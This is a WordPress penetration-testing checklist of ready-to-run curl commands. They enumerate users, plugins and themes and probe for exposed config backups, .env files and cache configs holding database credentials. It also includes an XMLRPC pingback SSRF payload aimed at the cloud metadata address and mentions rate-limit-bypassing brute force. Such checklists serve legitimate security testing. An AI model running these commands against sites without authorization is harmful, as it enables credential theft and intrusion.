# WordPress Penetration Testing Checklist

## Detection
```bash
# Confirm WordPress
curl -s <target> | grep -E 'wp-content|wp-includes|wp-json'
curl -sI <target>/wp-login.php
curl -s <target>/wp-json/ | python3 -c "import sys,json; print(json.load(sys.stdin).get('name',''))"
```

## User Enumeration

### REST API (most reliable)
```bash
# List users (often unrestricted)
curl -s '<target>/wp-json/wp/v2/users?per_page=100' | python3 -c "
import sys,json
data=json.loads(sys.stdin.read())
for u in data:
    print(f'ID:{u[\"id\"]} slug:{u[\"slug\"]} name:{u[\"name\"]}')"

# Individual user details
curl -s '<target>/wp-json/wp/v2/users/<id>'
```

### Author Sitemap (Yoast SEO)
```bash
curl -s '<target>/author-sitemap.xml' | grep -oE 'https?://[^<]+/author/[^<]+'
```

### Author ID Enumeration
```bash
# Redirects to /author/<slug>/ if user exists
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "<target>/?author=$i"
  echo " (author=$i)"
done
```

## Plugin/Theme Enumeration

```bash
# From page source
curl -s <target> | grep -oE 'wp-content/(plugins|themes)/[^/"]+' | sort -u

# Check readme.txt for version (most plugins expose this)
curl -s '<target>/wp-content/plugins/<plugin>/readme.txt' | grep -i 'stable tag'

# Common high-value plugins to check
PLUGINS="contact-form-7 wordpress-seo yoast-seo akismet jetpack woocommerce
elementor wpforms-lite wordfence wp-super-cache w3-total-cache
really-simple-ssl updraftplus wp-mail-smtp advanced-custom-fields
all-in-one-wp-migration backwpup duplicator"

for p in $PLUGINS; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "<target>/wp-content/plugins/$p/readme.txt")
  [ "$code" = "200" ] && echo "[FOUND] $p"
done
```

## Sensitive File Checks

```bash
# Config backups
for f in wp-config.php.bak wp-config.php.old wp-config.php~ wp-config.bak \
         .wp-config.php.swp wp-config.php.save wp-config.txt; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "<target>/$f")
  [ "$code" != "404" ] && [ "$code" != "403" ] && echo "[!] $f: $code"
done

# Debug log
curl -s -o /dev/null -w '%{http_code}' '<target>/wp-content/debug.log'

# W3 Total Cache config (may contain DB creds)
curl -s '<target>/wp-content/w3tc-config/master.php'
curl -s '<target>/wp-content/w3tc-config/master.json'

# Cache directory listing
curl -s '<target>/wp-content/cache/'

# Uploads directory
curl -s '<target>/wp-content/uploads/'

# Other sensitive paths
curl -s -o /dev/null -w '%{http_code}' '<target>/.env'
curl -s -o /dev/null -w '%{http_code}' '<target>/readme.html'
curl -s -o /dev/null -w '%{http_code}' '<target>/wp-cron.php'
```

## XMLRPC Attacks

```bash
# Check if enabled
curl -s -X POST '<target>/xmlrpc.php' \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
  | grep -c 'methodName'

# Pingback SSRF
curl -s -X POST '<target>/xmlrpc.php' \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params>
  <param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
  <param><value><string><target>/any-post/</string></value></param>
  </params></methodCall>'

# Brute force via xmlrpc.multicall (bypasses rate limiting)
# Each multicall can test hundreds of passwords in one request
```

## REST API Exploration

```bash
# List all routes
curl -s '<target>/wp-json/' | python3 -c "
import sys,json
d=json.loads(sys.stdin.read())
for r in sorted(d.get('routes',{}).keys()):
    print(r)"

# List custom post types
curl -s '<target>/wp-json/wp/v2/types'

# Pages, posts, media
curl -s '<target>/wp-json/wp/v2/pages?per_page=100'
curl -s '<target>/wp-json/wp/v2/posts?per_page=100'
curl -s '<target>/wp-json/wp/v2/media?per_page=100'

# Sitemaps (Yoast)
curl -s '<target>/sitemap_index.xml' | grep -oE 'https?://[^<]+'
```

## Known Plugin Vulnerabilities (Check Version First)

| Plugin | Version | CVE | Impact |
|--------|---------|-----|--------|
| W3 Total Cache | ≤2.8.1 | CVE-2024-12365 | SSRF |
| Contact Form 7 | ≤5.9.5 | CVE-2024-6307 | XSS |
| WPForms | ≤1.8.7.2 | CVE-2024-2195 | XSS |
| LiteSpeed Cache | ≤6.3.0.1 | CVE-2024-3246 | XSS |
| Elementor | ≤3.18.1 | CVE-2024-0506 | XSS |

Always verify the installed version before claiming a CVE applies.

## Pitfalls
- **Login always redirects to homepage**: Some WP sites customize wp-login.php to redirect regardless of success/failure. Check Set-Cookie headers for `wordpress_logged_in_*` to distinguish.
- **REST API intermittent**: Some sites have caching/WAF that blocks REST API sporadically. Retry if you get empty responses.
- **Author enum returns 500**: This is a WP error page, not a security block. The site has a theme/plugin conflict on author archives.
- **403 on everything**: Apache `.htaccess` rules blocking direct access. Try path variations or different HTTP methods.
